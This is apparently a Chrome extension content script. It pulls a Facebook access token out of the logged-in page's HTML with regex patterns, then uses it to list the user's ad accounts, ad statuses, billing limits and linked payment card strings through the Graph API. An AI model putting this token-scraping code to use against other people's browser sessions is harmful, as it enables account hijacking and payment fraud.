chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.action)
        switch (request.action) {
            case "get_token":
                sendResponse(DOMtoString(document));
                return true;
            case "get_adaccounts":
                var fields = [
                    "name",
                    "account_id",
                    "account_status",
                    "disable_reason",
                    "currency",
                    "business_country_code",
                    "adspaymentcycle",
                    "adtrust_dsl",
                    "ads.limit(500){status,effective_status,name,ad_review_feedback,adcreatives.limit(1){thumbnail_url}}",
                    "account_currency_ratio_to_usd",
                    "adspixels",
                ].join(",");
                var requests = [
                    {
                        method: "GET",
                        relative_url: `me/adaccounts?locale=ru_RU&fields=${fields}`,
                    },
                    {
                        method: "GET",
                        relative_url: `me/adaccounts?fields=all_payment_methods{pm_credit_card{display_string}}`,
                    },
                ];
                fetch(`https://graph.facebook.com/v15.0/?include_headers=false&access_token=${request.access_token}`, {
                    headers: {
                        accept: "*/*",
                        "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/x-www-form-urlencoded",
                    },
                    referrer: "https://www.facebook.com/",
                    referrerPolicy: "origin-when-cross-origin",
                    body: "batch=" + encodeURIComponent(JSON.stringify(requests)),
                    method: "POST",
                    mode: "cors",
                    credentials: "include",
                })
                    .then((response) => {
                        response.json().then((json_response) => {
                            var adaccounts_data = JSON.parse(json_response[0].body);
                            var adaccounts = [];
                            adaccounts_data.data.forEach((adaccount_data) => {
                                var adaccount = {
                                    id: adaccount_data.id,
                                    account_id: adaccount_data.account_id,
                                    name: adaccount_data.name,
                                    status: GetAccountStatusText(adaccount_data.account_status),
                                    disable_reason: GetDisableReasonText(adaccount_data.disable_reason),
                                    currency: adaccount_data.currency,
                                    daily_limit: adaccount_data.adtrust_dsl,
                                    country: adaccount_data.business_country_code,
                                    ads: [],
                                    ads_statuses: {
                                        active: 0,
                                        paused: 0,
                                        pending_review: 0,
                                        disapproved: 0,
                                    },
                                    currency_ratio_to_usd: adaccount_data.account_currency_ratio_to_usd,
                                    has_pixel: false,
                                };
                                if (adaccount_data.adspaymentcycle && adaccount_data.adspaymentcycle.data)
                                    adaccount.billing = adaccount_data.adspaymentcycle.data[0].threshold_amount / 100;
                                if (adaccount_data.ads) {
                                    adaccount_data.ads.data.forEach((ad_data) => {
                                        var ad = {
                                            id: ad_data.id,
                                            name: ad_data.name,
                                            status: ad_data.status,
                                            effective_status: ad_data.effective_status,
                                            ad_review_feedback: [],
                                            preview:
                                                ad_data.adcreatives.data.length == 0
                                                    ? ""
                                                    : ad_data.adcreatives.data[0].thumbnail_url,
                                        };
                                        if (ad_data.ad_review_feedback && ad_data.ad_review_feedback.global)
                                            for (var o in ad_data.ad_review_feedback.global)
                                                ad.ad_review_feedback.push(o);

                                        switch (ad.effective_status) {
                                            case "ACTIVE":
                                                adaccount.ads_statuses.active++;
                                                break;
                                            case "PAUSED":
                                            case "CAMPAIGN_PAUSED":
                                            case "ADSET_PAUSED":
                                                adaccount.ads_statuses.paused++;
                                                break;
                                            case "PENDING_REVIEW":
                                                adaccount.ads_statuses.pending_review++;
                                                break;
                                            default:
                                                adaccount.ads_statuses.disapproved++;
                                                break;
                                        }
                                        adaccount.ads.push(ad);
                                    });
                                    if (
                                        adaccount_data.adspixels &&
                                        adaccount_data.adspixels.data &&
                                        adaccount_data.adspixels.data.length > 0
                                    )
                                        adaccount.has_pixel = true;
                                }
                                adaccounts.push(adaccount);
                            });
                            var success_cards_request = false;
                            if (json_response[1].code == 200) {
                                success_cards_request = true;
                                adaccounts_data = JSON.parse(json_response[1].body);
                                adaccounts_data.data.forEach((adaccount_data) => {
                                    if (
                                        adaccount_data.all_payment_methods &&
                                        adaccount_data.all_payment_methods.pm_credit_card
                                    ) {
                                        var cards = [];
                                        adaccount_data.all_payment_methods.pm_credit_card.data.forEach((card) =>
                                            cards.push(card.display_string)
                                        );
                                        var adaccount = adaccounts.find((a) => a.id == adaccount_data.id);
                                        adaccount.card = cards.join(",");
                                    }
                                });
                            }
                            sendResponse({
                                adaccounts: adaccounts,
                                success_cards_request: success_cards_request,
                            });
                        });
                    })
                    .catch((error) => {
                        console.log(error);
                    });
                return true;
        }
    return true;
});

function DOMtoString(document_root) {
    var html = "",
        node = document_root.firstChild;
    while (node) {
        switch (node.nodeType) {
            case Node.ELEMENT_NODE:
                html += node.outerHTML;
                break;
            case Node.TEXT_NODE:
                html += node.nodeValue;
                break;
            case Node.CDATA_SECTION_NODE:
                html += "<![CDATA[" + node.nodeValue + "]]>";
                break;
            case Node.COMMENT_NODE:
                html += "<!--" + node.nodeValue + "-->";
                break;
            case Node.DOCUMENT_TYPE_NODE:
                // (X)HTML documents are identified by public identifiers
                html +=
                    "<!DOCTYPE " +
                    node.name +
                    (node.publicId ? ' PUBLIC "' + node.publicId + '"' : "") +
                    (!node.publicId && node.systemId ? " SYSTEM" : "") +
                    (node.systemId ? ' "' + node.systemId + '"' : "") +
                    ">\n";
                break;
        }
        node = node.nextSibling;
    }

    // var re = /access_token=(.*?)&/gi;
    var re = /"EAAB(.*?)"/gi;

    var token = re.exec(html);

    if (token != null) {
        token = "EAAB" + token[1];
        return token;
    }
    re = /"EAA(.*?)"/gi;

    token = re.exec(html);

    if (token != null) {
        token = "EAA" + token[1];
        return token;
    }
    return false;
}

function GetDisableReasonText(disable_reason) {
    switch (disable_reason) {
        case 1:
            return "POLICY";
        case 2:
            return "ADS_IP_REVIEW";
        case 3:
            return "RISK";
        case 4:
            return "GRAY_ACCOUNT_SHUT_DOWN";
        case 5:
            return "ADS_AFC_REVIEW";
        case 6:
            return "BUSINESS_INTEGRITY_RAR";
        case 7:
            return "PERMANENT_CLOSE";
        case 8:
            return "UNUSED_RESELLER_ACCOUNTR";
        default:
            return false;
    }
}

function GetAccountStatusText(status) {
    switch (status) {
        case 1:
            return "ACTIVE";
        case 2:
            return "DISABLED";
        case 3:
            return "UNSETTLED";
        case 7:
            return "PENDING_RISK_REVIEW";
        case 8:
            return "PENDING_SETTLEMENT";
        case 9:
            return "IN_GRACE_PERIOD";
        case 100:
            return "PENDING_CLOSURE";
        case 101:
            return "CLOSED";
        case 201:
            return "ANY_ACTIVE";
        case 202:
            return "ANY_CLOSED";
        default:
            return status;
    }
}
